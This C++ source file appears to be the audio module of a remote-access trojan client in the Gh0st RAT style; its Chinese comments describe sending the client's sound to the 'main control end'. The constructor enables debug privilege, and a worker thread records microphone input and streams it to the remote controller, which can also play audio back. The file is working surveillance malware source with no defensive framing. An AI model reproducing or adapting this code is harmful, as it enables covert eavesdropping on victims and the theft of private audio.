#include "pch.h"
#include "AudioManager.h"

CAudioManager::CAudioManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//回传数据包到服务器
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的进程信息
	m_IsLoop = FALSE;
	m_Audio = NULL;

	if (OnInitMember() == FALSE)
	{
		return;
	}

	BYTE	IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_IocpClient->OnSending((char*)&IsToken, 1);

	WaitingForDialogOpen();    //等待对话框打开


	//启动一个线程将客户端声音发送至主控端
	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendDataProcedure,
		(LPVOID)this, 0, NULL);
}

BOOL CAudioManager::OnInitMember()
{
	if (!waveInGetNumDevs())   //获取波形输入设备的数目实际就是看看有没有声卡
	{
		return FALSE;
	}


	if (m_IsLoop == TRUE)
	{
		return FALSE;
	}

	m_Audio = new CAudio;  //功能类对象的申请内存

	m_IsLoop = TRUE;
	return TRUE;
}

CAudioManager::~CAudioManager()
{
	_tprintf(_T("~CAudioManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);


	m_IsLoop = FALSE;                                  //设定工作状态为假
	WaitForSingleObject(m_ThreadHandle, INFINITE);    //等待 工作线程结束


	if (m_Audio != NULL)
	{
		delete m_Audio;
		m_Audio = NULL;
	}
}

void CAudioManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();  //当前类中的构造函数向下执行
		break;
	}
	default:
	{
		//播放主控端过来的声音
		m_Audio->PlayRecordData(BufferData, BufferLength);
		break;
	}
	}
}

DWORD WINAPI CAudioManager::SendDataProcedure(LPVOID ParameterData)
{
	CAudioManager* This = (CAudioManager*)ParameterData;
	while (This->m_IsLoop)
	{
		This->SendRecordData();
	}
	_tprintf(_T("CAudioManager::SendDataProcedure() 退出\r\n"));
	return 0;
}

int CAudioManager::SendRecordData()
{
	DWORD	BufferLength = 0;
	DWORD	ReturnLength = 0;
	//这里得到音频数据
	LPBYTE	v1 = m_Audio->GetRecordData(&BufferLength);
	if (v1 == NULL)
	{
		return 0;
	}
	//分配缓冲区
	LPBYTE	BufferData = new BYTE[BufferLength + 1];
	//加入数据头
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;     //向主控端发送该消息
	//复制缓冲区
	memcpy(BufferData + 1, v1, BufferLength);
	//发送出去
	if (BufferLength > 0)
	{
		ReturnLength = m_IocpClient->OnSending((char*)BufferData, BufferLength + 1);
	}
	if (BufferData != NULL)
	{
		delete	BufferData;
		BufferData = NULL;
	}

	return ReturnLength;
}
